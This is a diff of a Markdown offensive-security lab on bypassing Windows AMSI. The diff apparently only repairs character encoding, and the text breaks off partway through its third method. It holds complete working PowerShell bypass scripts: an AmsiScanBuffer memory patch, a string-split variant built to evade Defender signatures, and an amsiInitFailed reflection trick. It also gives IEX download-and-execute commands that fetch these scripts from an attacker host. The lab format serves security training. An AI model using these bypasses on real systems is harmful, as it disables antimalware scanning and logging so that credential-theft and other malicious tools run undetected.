@@ -1,17 +1,17 @@
-# Phase 04 Lab â€” AMSI Bypass
+# Phase 04 Lab — AMSI Bypass
 ## Zero to Working Bypass. Three Methods. Full Understanding.
 
 > **Teaching pattern used throughout:**
-> ðŸ”· **WHAT** â€” What is this thing, defined simply
-> ðŸ”¶ **WHY** â€” Why does Windows have it, what problem does it solve
-> âš”ï¸ **HOW** â€” How attackers exploit or interact with it
-> ðŸ§  **LOCK IT IN** â€” An analogy or visual to make it permanent
+> 🔷 **WHAT** — What is this thing, defined simply
+> 🔶 **WHY** — Why does Windows have it, what problem does it solve
+> ⚔️ **HOW** — How attackers exploit or interact with it
+> 🧠 **LOCK IT IN** — An analogy or visual to make it permanent
 
 ---
 
-## Before You Begin â€” What This Lab Actually Teaches
+## Before You Begin — What This Lab Actually Teaches
 
-Most people treat AMSI bypass as a magic incantation â€” paste this script, it works, move on. That approach fails the moment the signature gets updated, which happens every few days.
+Most people treat AMSI bypass as a magic incantation — paste this script, it works, move on. That approach fails the moment the signature gets updated, which happens every few days.
 
 This lab teaches you to understand AMSI deeply enough that you can:
 - Write your own bypass from scratch
@@ -20,22 +20,22 @@ This lab teaches you to understand AMSI deeply enough that you can:
 - Explain to a blue teamer what they should be looking for
 
 **What you need:**
-- Kali Linux VM â€” attacker machine
-- Windows 10 or 11 VM â€” victim machine with **Defender real-time protection fully ON**
+- Kali Linux VM — attacker machine
+- Windows 10 or 11 VM — victim machine with **Defender real-time protection fully ON**
 - Both VMs on the same network (host-only adapter, e.g. `192.168.56.0/24`)
 - Two snapshots of your Windows VM taken *right now*, before you touch anything:
-  - Snapshot A: "Clean â€” Defender ON, nothing modified"
-  - Snapshot B: same â€” you will revert to this between each bypass method
+  - Snapshot A: "Clean — Defender ON, nothing modified"
+  - Snapshot B: same — you will revert to this between each bypass method
 
 ---
 
-## SECTION 1 â€” What AMSI Is
+## SECTION 1 — What AMSI Is
 
-**ðŸ”· WHAT**
+**🔷 WHAT**
 
-AMSI is the **Antimalware Scan Interface** â€” a Windows API introduced in Windows 10 that lets antivirus vendors inspect script content **at the moment of execution**, not just when the file is written to disk.
+AMSI is the **Antimalware Scan Interface** — a Windows API introduced in Windows 10 that lets antivirus vendors inspect script content **at the moment of execution**, not just when the file is written to disk.
 
-It is not a process. It is not a service you can stop with `sc stop`. It is a **DLL** â€” `amsi.dll` â€” that gets loaded directly into the memory of any process that hosts a scripting engine:
+It is not a process. It is not a service you can stop with `sc stop`. It is a **DLL** — `amsi.dll` — that gets loaded directly into the memory of any process that hosts a scripting engine:
 
 ```
 powershell.exe          loads amsi.dll
@@ -49,72 +49,72 @@ Office (VBA macros)     loads amsi.dll
 The critical function inside `amsi.dll` that does the actual scanning is called **`AmsiScanBuffer`**. Every block of script content that a host process is about to execute is passed through this function first.
 
 ```
-â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
-â”‚                         powershell.exe                              â”‚
-â”‚                                                                     â”‚
-â”‚   You type: Invoke-Mimikatz                                        â”‚
-â”‚                      â†“                                              â”‚
-â”‚   PowerShell prepares to run the script block                      â”‚
-â”‚                      â†“                                              â”‚
-â”‚   PowerShell calls: AmsiScanBuffer("Invoke-Mimikatz", length, ...) â”‚
-â”‚                      â†“                                              â”‚
-â”‚   amsi.dll passes content to registered AMSI provider (Defender)   â”‚
-â”‚                      â†“                                              â”‚
-â”‚         â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                     â”‚
-â”‚         â”‚       Windows Defender             â”‚                     â”‚
-â”‚         â”‚  Content: "Invoke-Mimikatz"        â”‚                     â”‚
-â”‚         â”‚  Result: AMSI_RESULT_DETECTED      â”‚  â† return value     â”‚
-â”‚         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                     â”‚
-â”‚                      â†“                                              â”‚
-â”‚   PowerShell receives: 32768 (DETECTED)                            â”‚
-â”‚                      â†“                                              â”‚
-â”‚   PowerShell throws error and STOPS execution                      â”‚
-â”‚                                                                     â”‚
-â”‚   "This script contains malicious content and has been blocked"    â”‚
-â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
+┌─────────────────────────────────────────────────────────────────────┐
+│                         powershell.exe                              │
+│                                                                     │
+│   You type: Invoke-Mimikatz                                        │
+│                      ↓                                              │
+│   PowerShell prepares to run the script block                      │
+│                      ↓                                              │
+│   PowerShell calls: AmsiScanBuffer("Invoke-Mimikatz", length, ...) │
+│                      ↓                                              │
+│   amsi.dll passes content to registered AMSI provider (Defender)   │
+│                      ↓                                              │
+│         ┌────────────────────────────────────┐                     │
+│         │       Windows Defender             │                     │
+│         │  Content: "Invoke-Mimikatz"        │                     │
+│         │  Result: AMSI_RESULT_DETECTED      │  ← return value     │
+│         └────────────────────────────────────┘                     │
+│                      ↓                                              │
+│   PowerShell receives: 32768 (DETECTED)                            │
+│                      ↓                                              │
+│   PowerShell throws error and STOPS execution                      │
+│                                                                     │
+│   "This script contains malicious content and has been blocked"    │
+└─────────────────────────────────────────────────────────────────────┘
 ```
 
 The return values from `AmsiScanBuffer` that matter:
 
 | Return value | Constant name | Meaning |
 |---|---|---|
-| `1` | `AMSI_RESULT_CLEAN` | Content is safe â€” allow execution |
-| `32768` | `AMSI_RESULT_DETECTED` | Malicious content â€” block execution |
+| `1` | `AMSI_RESULT_CLEAN` | Content is safe — allow execution |
+| `32768` | `AMSI_RESULT_DETECTED` | Malicious content — block execution |
 
-**ðŸ”¶ WHY**
+**🔶 WHY**
 
 Before AMSI existed, attackers simply encoded their tools in base64. Mimikatz encoded in base64 looks like random characters to a file scanner. The file on disk passes AV. At runtime, PowerShell decodes and executes it. AV never saw the decoded version.
 
 ```
 Old world (pre-AMSI):
-File on disk: "SW52b2tlLU1pbWlrYXR6"  â† looks like gibberish â†’ AV says CLEAN
-PowerShell decodes at runtime â†’ runs Invoke-Mimikatz â†’ AV never saw it
+File on disk: "SW52b2tlLU1pbWlrYXR6"  ← looks like gibberish → AV says CLEAN
+PowerShell decodes at runtime → runs Invoke-Mimikatz → AV never saw it
 
 New world (AMSI):
-File on disk: "SW52b2tlLU1pbWlrYXR6"  â† AV still says CLEAN on disk
-PowerShell decodes at runtime â†’ AMSI scans the decoded content
-AMSI sees: "Invoke-Mimikatz"  â† caught, blocked
+File on disk: "SW52b2tlLU1pbWlrYXR6"  ← AV still says CLEAN on disk
+PowerShell decodes at runtime → AMSI scans the decoded content
+AMSI sees: "Invoke-Mimikatz"  ← caught, blocked
 ```
 
 Microsoft's insight: scan the content *after* decoding, just before execution. At that moment, all obfuscation has been removed. AMSI sees the real content regardless of how it was encoded on disk.
 
-**âš”ï¸ HOW**
+**⚔️ HOW**
 
-The attack surface is the `AmsiScanBuffer` function itself. It lives in `amsi.dll` which is loaded into the PowerShell process. You are running inside that same process. If you can modify the bytes of `AmsiScanBuffer` in memory, you control what it returns. If you make it always return `1` (AMSI_RESULT_CLEAN), every scan passes â€” regardless of what you run.
+The attack surface is the `AmsiScanBuffer` function itself. It lives in `amsi.dll` which is loaded into the PowerShell process. You are running inside that same process. If you can modify the bytes of `AmsiScanBuffer` in memory, you control what it returns. If you make it always return `1` (AMSI_RESULT_CLEAN), every scan passes — regardless of what you run.
 
 The bypass is not about hiding your tool. It is about corrupting the judge before the trial starts.
 
-**ðŸ§  LOCK IT IN**
+**🧠 LOCK IT IN**
 
 AMSI is a courthouse metal detector. Before AMSI, attackers smuggled in weapons by wrapping them in innocent-looking packaging (base64 encoding). The packaging got through the old scanners. AMSI is the new scanner that unwraps the package and scans what's inside.
 
-Bypassing AMSI is not sneaking past the metal detector â€” it is bribing the security guard to report everything as safe before the scan even runs.
+Bypassing AMSI is not sneaking past the metal detector — it is bribing the security guard to report everything as safe before the scan even runs.
 
 ---
 
-## SECTION 2 â€” AmsiScanBuffer: The Exact Target
+## SECTION 2 — AmsiScanBuffer: The Exact Target
 
-**ðŸ”· WHAT**
+**🔷 WHAT**
 
 `AmsiScanBuffer` is an exported function inside `amsi.dll`. Its job is to receive a buffer of content, pass it to registered AV providers, and return a scan result. In x64 assembly, when a function is first entered, the first few instructions set up the stack frame. These instructions are what we overwrite.
 
@@ -133,38 +133,38 @@ HRESULT AmsiScanBuffer(
 
 The bytes of this function live in memory inside `amsi.dll`, which is loaded into the PowerShell process.
 
-**ðŸ”¶ WHY**
+**🔶 WHY**
 
-Every function in a DLL is at a fixed, findable memory address once the DLL is loaded. Windows exposes `GetProcAddress` â€” a legitimate API call â€” specifically to let programs find the address of any exported function in any loaded DLL. This is how programs link to each other at runtime.
+Every function in a DLL is at a fixed, findable memory address once the DLL is loaded. Windows exposes `GetProcAddress` — a legitimate API call — specifically to let programs find the address of any exported function in any loaded DLL. This is how programs link to each other at runtime.
 
-We use this exact mechanism to find `AmsiScanBuffer` â€” the same way a legitimate program would.
+We use this exact mechanism to find `AmsiScanBuffer` — the same way a legitimate program would.
 
-**âš”ï¸ HOW**
+**⚔️ HOW**
 
 Three bytes control what `AmsiScanBuffer` returns:
 
 ```asm
 ; What we write at the start of AmsiScanBuffer:
-XOR EAX, EAX    ; set return value register (EAX) to 0 â€” but we want 1
+XOR EAX, EAX    ; set return value register (EAX) to 0 — but we want 1
                 ; actually: we use a MOV instruction to force a specific return value
 RET             ; return immediately before any scanning happens
 
 ; The exact patch bytes that force AMSI_RESULT_CLEAN:
-B8 57 00 07 80  ; MOV EAX, 0x80070057  (returns E_INVALIDARG â€” an error code)
+B8 57 00 07 80  ; MOV EAX, 0x80070057  (returns E_INVALIDARG — an error code)
 C3              ; RET
 
-; PowerShell interprets an AMSI error as "scan unavailable" â†’ allows execution
+; PowerShell interprets an AMSI error as "scan unavailable" → allows execution
 ; This is the actual trick: we don't return CLEAN, we return an ERROR
-; PowerShell's error handling: "AMSI failed â†’ assume clean â†’ execute anyway"
+; PowerShell's error handling: "AMSI failed → assume clean → execute anyway"
 ```
 
-**ðŸ§  LOCK IT IN**
+**🧠 LOCK IT IN**
 
-The function is a customs officer checking your luggage. Instead of sneaking past the officer or hiding your contraband better, you walk up before any travellers arrive and put a permanent "APPROVED" stamp in the officer's hand â€” so every bag they check from that moment on gets stamped as approved automatically, without actually being checked.
+The function is a customs officer checking your luggage. Instead of sneaking past the officer or hiding your contraband better, you walk up before any travellers arrive and put a permanent "APPROVED" stamp in the officer's hand — so every bag they check from that moment on gets stamped as approved automatically, without actually being checked.
 
 ---
 
-## SECTION 3 â€” Lab Environment Setup
+## SECTION 3 — Lab Environment Setup
 
 ### Step 1: Verify your Windows VM is protected
 
@@ -219,17 +219,17 @@ This script contains malicious content and has been blocked by your antivirus so
 
 ```
 You typed:     'AmsiUtils'
-                    â†“
+                    ↓
 PowerShell sent the string to AmsiScanBuffer
-                    â†“
+                    ↓
 Defender's AMSI provider checked its signatures
-                    â†“
-Found match for: "AmsiUtils" â†’ AMSI_RESULT_DETECTED
-                    â†“
+                    ↓
+Found match for: "AmsiUtils" → AMSI_RESULT_DETECTED
+                    ↓
 PowerShell was blocked before the string even printed
 ```
 
-Note: the string is not malicious by itself. Defender signatures it because it appears in essentially every AMSI bypass script. It is used as a canary â€” if `'AmsiUtils'` prints without error, AMSI is bypassed.
+Note: the string is not malicious by itself. Defender signatures it because it appears in essentially every AMSI bypass script. It is used as a canary — if `'AmsiUtils'` prints without error, AMSI is bypassed.
 
 ### Step 5: Set up your HTTP server on Kali
 
@@ -244,49 +244,49 @@ You will host bypass scripts here and download them from the Windows VM.
 
 ---
 
-## SECTION 4 â€” Understanding Memory Patching (Before the Bypass)
+## SECTION 4 — Understanding Memory Patching (Before the Bypass)
 
-**ðŸ”· WHAT**
+**🔷 WHAT**
 
-Memory patching means modifying the bytes of a function in RAM while it is running. We are not modifying the file on disk â€” we are modifying the live code inside the PowerShell process's own memory.
+Memory patching means modifying the bytes of a function in RAM while it is running. We are not modifying the file on disk — we are modifying the live code inside the PowerShell process's own memory.
 
-When `amsi.dll` is loaded into the PowerShell process, its code is copied into that process's virtual memory. That memory is normally marked as read-execute (RX) â€” readable and executable, but not writable. You cannot modify RX memory. We have to change the protection first.
+When `amsi.dll` is loaded into the PowerShell process, its code is copied into that process's virtual memory. That memory is normally marked as read-execute (RX) — readable and executable, but not writable. You cannot modify RX memory. We have to change the protection first.
 
-**ðŸ”¶ WHY**
+**🔶 WHY**
 
-Windows marks code pages as non-writable intentionally. If any process could write to any code page, malware could trivially overwrite the code of system processes from inside user mode. The protection forces you to explicitly request write access before modifying code â€” creating an observable event.
+Windows marks code pages as non-writable intentionally. If any process could write to any code page, malware could trivially overwrite the code of system processes from inside user mode. The protection forces you to explicitly request write access before modifying code — creating an observable event.
 
-**âš”ï¸ HOW**
+**⚔️ HOW**
 
 The patching sequence:
 
 ```
 1. Find amsi.dll in the current process's memory
-   â†’ [System.Reflection.Assembly]::LoadWithPartialName() or LoadLibrary("amsi.dll")
-   â†’ Get the base address of amsi.dll
+   → [System.Reflection.Assembly]::LoadWithPartialName() or LoadLibrary("amsi.dll")
+   → Get the base address of amsi.dll
 
 2. Find the address of AmsiScanBuffer inside amsi.dll
-   â†’ GetProcAddress(amsi_handle, "AmsiScanBuffer")
-   â†’ Returns: the exact memory address of the first byte of the function
+   → GetProcAddress(amsi_handle, "AmsiScanBuffer")
+   → Returns: the exact memory address of the first byte of the function
 
 3. Change the memory protection at that address from RX to RWX
-   â†’ VirtualProtect(AmsiScanBuffer_address, size, PAGE_EXECUTE_READWRITE)
-   â†’ Now we can write to it
+   → VirtualProtect(AmsiScanBuffer_address, size, PAGE_EXECUTE_READWRITE)
+   → Now we can write to it
 
 4. Overwrite the first bytes of the function with our patch bytes
-   â†’ Marshal.Copy(patch_bytes, 0, AmsiScanBuffer_address, patch_bytes.Length)
+   → Marshal.Copy(patch_bytes, 0, AmsiScanBuffer_address, patch_bytes.Length)
 
-5. Change the protection back to RX (optional â€” reduces detection)
-   â†’ VirtualProtect(AmsiScanBuffer_address, size, PAGE_EXECUTE_READ)
+5. Change the protection back to RX (optional — reduces detection)
+   → VirtualProtect(AmsiScanBuffer_address, size, PAGE_EXECUTE_READ)
 ```
 
-**ðŸ§  LOCK IT IN**
+**🧠 LOCK IT IN**
 
-Think of `AmsiScanBuffer` as a function written in pencil on paper inside a glass case. The glass protects it from being erased (RX memory protection). To patch it, you ask the OS to temporarily open the glass case (VirtualProtect â†’ RWX). You erase the first few words and write new ones (Marshal.Copy). Then you close the case again. Anyone who calls this function now reads your replacement words, not the originals.
+Think of `AmsiScanBuffer` as a function written in pencil on paper inside a glass case. The glass protects it from being erased (RX memory protection). To patch it, you ask the OS to temporarily open the glass case (VirtualProtect → RWX). You erase the first few words and write new ones (Marshal.Copy). Then you close the case again. Anyone who calls this function now reads your replacement words, not the originals.
 
 ---
 
-## SECTION 5 â€” Bypass Method 1: AmsiScanBuffer Patch
+## SECTION 5 — Bypass Method 1: AmsiScanBuffer Patch
 
 ### What this method does
 
@@ -296,12 +296,12 @@ Locates `AmsiScanBuffer` in memory and overwrites its first bytes so it always r
 
 This is the closest to the metal. You see every step: find the DLL, find the function, change memory protection, write patch bytes. Every other bypass is a variation or abstraction of this core technique.
 
-### The bypass code â€” explained line by line
+### The bypass code — explained line by line
 
 Create this file on your Kali at `~/lab/amsi/bypass1.ps1`:
 
 ```powershell
-# bypass1.ps1 â€” AmsiScanBuffer direct patch
+# bypass1.ps1 — AmsiScanBuffer direct patch
 
 # STEP 1: Load amsi.dll into the current process if not already loaded
 # LoadLibrary returns the base address of the DLL in memory
@@ -316,8 +316,8 @@ $amsi_dll = [System.Runtime.InteropServices.Marshal]::GetHINSTANCE(
 
 # STEP 2: Declare the Win32 API functions we need using Add-Type
 # We need two functions from Windows API:
-#   GetProcAddress â€” finds a function inside a loaded DLL by name
-#   VirtualProtect  â€” changes memory page protection flags
+#   GetProcAddress — finds a function inside a loaded DLL by name
+#   VirtualProtect  — changes memory page protection flags
 $Win32 = @"
 using System;
 using System.Runtime.InteropServices;
@@ -332,7 +332,7 @@ public class Win32 {
     public static extern IntPtr LoadLibrary(string name);
 
     // Change the memory protection flags on a region of memory
-    // We use this to change RX (read-execute) â†’ RWX (read-write-execute)
+    // We use this to change RX (read-execute) → RWX (read-write-execute)
     // so we can overwrite the function bytes
     [DllImport("kernel32")]
     public static extern bool VirtualProtect(
@@ -349,7 +349,7 @@ public class Win32 {
 Add-Type $Win32
 
 # STEP 3: Get the base address of amsi.dll
-# LoadLibrary("amsi.dll") â€” if already loaded, just returns the existing handle
+# LoadLibrary("amsi.dll") — if already loaded, just returns the existing handle
 $amsiLib = [Win32]::LoadLibrary("amsi.dll")
 
 # STEP 4: Get the exact address of AmsiScanBuffer inside amsi.dll
@@ -363,7 +363,7 @@ $amsiAddr = [Win32]::GetProcAddress($amsiLib, "AmsiScanBuffer")
 #   ... (this is what we are about to overwrite)
 
 # STEP 5: Change memory protection to allow writing
-# 0x40 = PAGE_EXECUTE_READWRITE â€” allows read, write, and execute
+# 0x40 = PAGE_EXECUTE_READWRITE — allows read, write, and execute
 $oldProtect = 0
 [Win32]::VirtualProtect($amsiAddr, [uint32]5, 0x40, [ref]$oldProtect)
 
@@ -374,29 +374,29 @@ $oldProtect = 0
 #
 # 0x80070057 is the Windows error code E_INVALIDARG
 # PowerShell checks the return of AmsiScanBuffer:
-#   If result is an HRESULT error (high bit set) â†’ treat as scan failure
-#   On scan failure â†’ PowerShell allows execution to continue
+#   If result is an HRESULT error (high bit set) → treat as scan failure
+#   On scan failure → PowerShell allows execution to continue
 #
-# So we are not returning "clean" â€” we are returning "scan failed"
+# So we are not returning "clean" — we are returning "scan failed"
 # and PowerShell's error handling allows the script to run anyway
 $patch = [Byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $amsiAddr, 6)
 
 # STEP 7: Restore the original memory protection (reduces EDR detection surface)
-# Leaving memory as RWX is suspicious â€” EDRs scan for RWX regions
+# Leaving memory as RWX is suspicious — EDRs scan for RWX regions
 [Win32]::VirtualProtect($amsiAddr, [uint32]5, $oldProtect, [ref]$oldProtect)
 
 Write-Host "[+] AmsiScanBuffer patched. AMSI is disabled for this session." -ForegroundColor Green
 ```
 
-### Running Bypass 1 â€” step by step
+### Running Bypass 1 — step by step
 
 **On Kali:** verify the file is served:
 ```bash
 curl http://127.0.0.1:8080/bypass1.ps1 | head -5
 ```
 
-**On Windows VM** â€” open PowerShell (does not need to be admin for this bypass):
+**On Windows VM** — open PowerShell (does not need to be admin for this bypass):
 
 ```powershell
 # Step 1: Confirm AMSI is blocking
@@ -407,32 +407,32 @@ curl http://127.0.0.1:8080/bypass1.ps1 | head -5
 IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.10:8080/bypass1.ps1')
 # Expected: [+] AmsiScanBuffer patched. AMSI is disabled for this session.
 
-# Step 3: Test the canary string â€” this should now print without error
+# Step 3: Test the canary string — this should now print without error
 'AmsiUtils'
 # Expected: AmsiUtils
-# â† AMSI is bypassed. The string prints cleanly.
+# ← AMSI is bypassed. The string prints cleanly.
 
 # Step 4: Test with something that would definitely have been blocked
 'Invoke-Mimikatz'
 # Expected: Invoke-Mimikatz
-# â† No block. AMSI is fully disabled for this PowerShell session.
+# ← No block. AMSI is fully disabled for this PowerShell session.
 ```
 
 ### What is actually happening in memory when this runs
 
 ```
-Before patch â€” AmsiScanBuffer first 6 bytes:
+Before patch — AmsiScanBuffer first 6 bytes:
   Address: 0x7FFC12345678
-  Bytes: 55 4C 8B DC 49 89  â† real function prologue
+  Bytes: 55 4C 8B DC 49 89  ← real function prologue
   Meaning: PUSH RBP; MOV R11,RSP; ...  (sets up stack frame, then scans)
 
-After patch â€” AmsiScanBuffer first 6 bytes:
+After patch — AmsiScanBuffer first 6 bytes:
   Address: 0x7FFC12345678
-  Bytes: B8 57 00 07 80 C3  â† our patch
+  Bytes: B8 57 00 07 80 C3  ← our patch
   Meaning: MOV EAX,0x80070057; RET  (returns error immediately, no scan)
 
 Result: every call to AmsiScanBuffer returns 0x80070057 (E_INVALIDARG)
-PowerShell: "AMSI scan failed â€” proceed without scan result"
+PowerShell: "AMSI scan failed — proceed without scan result"
 ```
 
 ### Why this bypass gets caught (the problem)
@@ -445,27 +445,27 @@ Revert your Windows VM snapshot. We will fix this in the next section.
 
 ---
 
-## SECTION 6 â€” Fixing the Paradox: String Obfuscation
+## SECTION 6 — Fixing the Paradox: String Obfuscation
 
-**ðŸ”· WHAT**
+**🔷 WHAT**
 
 The bypass script itself is scanned by AMSI before it runs. The strings `"AmsiScanBuffer"` and `"amsi.dll"` are directly in Defender's AMSI signatures. We need those strings to not appear literally in our script, but to appear *at runtime* when AMSI is not looking.
 
-**ðŸ”¶ WHY**
+**🔶 WHY**
 
 AMSI scans string literals in the script. It does not scan the results of string concatenation operations. If you split a string into parts and join them at runtime, the scanner sees the pieces, not the complete signature.
 
 ```
 AMSI scans this as-is:
-"AmsiScanBuffer"     â† full string, matches signature â†’ BLOCKED
+"AmsiScanBuffer"     ← full string, matches signature → BLOCKED
 
 AMSI scans this and sees pieces:
-"Amsi" + "Scan" + "Buffer"  â† three separate strings, none match â†’ ALLOWED
-At runtime: PowerShell joins them â†’ "AmsiScanBuffer"  â† AmsiScanBuffer now appears
-But AMSI already ran â†’ too late to block
+"Amsi" + "Scan" + "Buffer"  ← three separate strings, none match → ALLOWED
+At runtime: PowerShell joins them → "AmsiScanBuffer"  ← AmsiScanBuffer now appears
+But AMSI already ran → too late to block
 ```
 
-**âš”ï¸ HOW**
+**⚔️ HOW**
 
 Use AMSITrigger first to find *exactly* which strings in your script are triggering AMSI:
 
@@ -490,7 +490,7 @@ AMSITrigger will output the exact line and string that triggered AMSI. For bypas
 Now create the obfuscated version on Kali at `~/lab/amsi/bypass1_obf.ps1`:
 
 ```powershell
-# bypass1_obf.ps1 â€” Same patch, strings split to avoid AMSI signature
+# bypass1_obf.ps1 — Same patch, strings split to avoid AMSI signature
 
 $Win32 = @"
 using System;
@@ -506,16 +506,16 @@ public class Win32 {
 "@
 Add-Type $Win32
 
-# Split the DLL name: "amsi" + ".dll" â€” neither half matches the signature
+# Split the DLL name: "amsi" + ".dll" — neither half matches the signature
 $lib  = [Win32]::LoadLibrary("am" + "si.dll")
 
-# Split the function name: "Amsi" + "Scan" + "Buffer" â€” none of the three parts match
+# Split the function name: "Amsi" + "Scan" + "Buffer" — none of the three parts match
 $func = [Win32]::GetProcAddress($lib, "Amsi" + "Scan" + "Buffer")
 
 $p = 0
 [Win32]::VirtualProtect($func, [uint32]5, 0x40, [ref]$p)
 
-# Patch bytes â€” these are raw bytes, not strings, so AMSI cannot signature them
+# Patch bytes — these are raw bytes, not strings, so AMSI cannot signature them
 $patch = [Byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $func, 6)
 
@@ -530,25 +530,25 @@ IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.10:8080/bypass1
 # Expected: [+] Done.
 
 'AmsiUtils'
-# Expected: AmsiUtils  â† bypassed
+# Expected: AmsiUtils  ← bypassed
 ```
 
-**ðŸ§  LOCK IT IN**
+**🧠 LOCK IT IN**
 
-AMSITrigger is a metal detector calibration tool. You walk your script through the detector before using it live to find exactly which item in your bag is setting off the alarm. Then you disassemble that item into pieces that each pass individually â€” and reassemble it inside the bag after you get through.
+AMSITrigger is a metal detector calibration tool. You walk your script through the detector before using it live to find exactly which item in your bag is setting off the alarm. Then you disassemble that item into pieces that each pass individually — and reassemble it inside the bag after you get through.
 
 ---
 
-## SECTION 7 â€” Bypass Method 2: amsiInitFailed Flag
+## SECTION 7 — Bypass Method 2: amsiInitFailed Flag
 
-**ðŸ”· WHAT**
+**🔷 WHAT**
 
 Deep inside the PowerShell engine (`System.Management.Automation.dll`), there is a private static field called `amsiInitFailed`. This is a boolean flag PowerShell checks internally:
 
 ```csharp
 // Simplified view of what PowerShell does internally:
 if (amsiInitFailed == true) {
-    // AMSI failed to initialise â€” skip scanning
+    // AMSI failed to initialise — skip scanning
     return;
 }
 // ... otherwise, call AmsiScanBuffer and scan the content
@@ -556,33 +556,33 @@ if (amsiInitFailed == true) {
 
 If we flip this flag to `true`, PowerShell believes AMSI failed to initialise and **skips all scanning** for the rest of the session.
 
-**ðŸ”¶ WHY**
+**🔶 WHY**
 
-PowerShell includes a graceful fallback: if AMSI fails to start up properly (e.g. the DLL can't be loaded, or initialisation fails), it continues running without AV scanning rather than refusing to function. This is a design decision â€” PowerShell prioritises operability over security in the initialisation failure case.
+PowerShell includes a graceful fallback: if AMSI fails to start up properly (e.g. the DLL can't be loaded, or initialisation fails), it continues running without AV scanning rather than refusing to function. This is a design decision — PowerShell prioritises operability over security in the initialisation failure case.
 
 The flag exists so PowerShell does not keep trying to call a broken AMSI on every script block.
 
-**âš”ï¸ HOW**
+**⚔️ HOW**
 
-.NET's reflection API lets you access private fields of any .NET class at runtime â€” including fields marked as `private` and `static` that are normally inaccessible outside the class. This is a legitimate .NET feature designed for testing and debugging frameworks. We abuse it to set an internal flag.
+.NET's reflection API lets you access private fields of any .NET class at runtime — including fields marked as `private` and `static` that are normally inaccessible outside the class. This is a legitimate .NET feature designed for testing and debugging frameworks. We abuse it to set an internal flag.
 
 ```
 .NET Reflection path:
-[Ref].Assembly                      â† the PowerShell engine assembly (System.Management.Automation)
-  .GetType('...AmsiUtils')          â† find the internal AmsiUtils class
-    .GetField('amsiInitFailed',     â† find the amsiInitFailed field
-              'NonPublic,Static')   â† it is private (NonPublic) and static
-      .SetValue($null, $true)       â† set it to true
+[Ref].Assembly                      ← the PowerShell engine assembly (System.Management.Automation)
+  .GetType('...AmsiUtils')          ← find the internal AmsiUtils class
+    .GetField('amsiInitFailed',     ← find the amsiInitFailed field
+              'NonPublic,Static')   ← it is private (NonPublic) and static
+      .SetValue($null, $true)       ← set it to true
 ```
 
 Create `~/lab/amsi/bypass2.ps1` on Kali:
 
 ```powershell
-# bypass2.ps1 â€” amsiInitFailed flag via reflection
+# bypass2.ps1 — amsiInitFailed flag via reflection
 
 # Strings that need obfuscation:
-#   "System.Management.Automation.AmsiUtils"  â† class name
-#   "amsiInitFailed"                           â† field name
+#   "System.Management.Automation.AmsiUtils"  ← class name
+#   "amsiInitFailed"                           ← field name
 # Both are signatured. Split them:
 
 $class = [Ref].Assembly.GetType(
@@ -594,7 +594,7 @@ $field = $class.GetField(
     'NonPublic,Static'
 )
 
-# Set the flag to true â€” PowerShell now thinks AMSI init failed
+# Set the flag to true — PowerShell now thinks AMSI init failed
 $field.SetValue($null, $true)
 
 Write-Host "[+] amsiInitFailed set to true. AMSI disabled." -ForegroundColor Green
@@ -615,7 +615,7 @@ IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.10:8080/bypass2
 
 # Test
 'AmsiUtils'
-# Expected: AmsiUtils  â† AMSI bypassed
+# Expected: AmsiUtils  ← AMSI bypassed
 ```
 
 ### Comparing Methods 1 and 2
@@ -629,23 +629,23 @@ IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.10:8080/bypass2
 | **Patch persistence** | Until process exits | Until process exits |
 | **Complexity** | Higher | Lower |
 
-Both work. Method 2 is simpler code. Method 1 operates at a lower level and has different detection characteristics â€” useful when one gets caught and the other does not.
+Both work. Method 2 is simpler code. Method 1 operates at a lower level and has different detection characteristics — useful when one gets caught and the other does not.
 
-**ðŸ§  LOCK IT IN**
+**🧠 LOCK IT IN**
 
 Method 1 (patch): You physically damage the scanner so it cannot scan anything.
 
-Method 2 (flag): You do not touch the scanner at all. You find the sign-in sheet and write "scanner broken â€” out of service" on it. The security desk reads the sheet, assumes the scanner is broken, and waves everyone through without scanning.
+Method 2 (flag): You do not touch the scanner at all. You find the sign-in sheet and write "scanner broken — out of service" on it. The security desk reads the sheet, assumes the scanner is broken, and waves everyone through without scanning.
 
 ---
 
-## SECTION 8 â€” Bypass Method 3: Invisi-Shell
+## SECTION 8 — Bypass Method 3: Invisi-Shell
 
-**ðŸ”· WHAT**
+**🔷 WHAT**
 
 Invisi-Shell is a tool that patches AMSI at the **CLR (Common Language Runtime) level**, before PowerShell's AMSI integration even loads. It works by hooking into the .NET CLR registration process for AMSI providers, replacing the real provider with a dummy one that always returns clean.
 
-Unlike Methods 1 and 2 which patch from *inside* a running PowerShell session, Invisi-Shell patches *before* the session fully starts â€” at the moment the CLR initialises.
+Unlike Methods 1 and 2 which patch from *inside* a running PowerShell session, Invisi-Shell patches *before* the session fully starts — at the moment the CLR initialises.
 
 Additionally, Invisi-Shell also:
 - Disables PowerShell **Script Block Logging** (Event 4104)
@@ -654,15 +654,15 @@ Additionally, Invisi-Shell also:
 
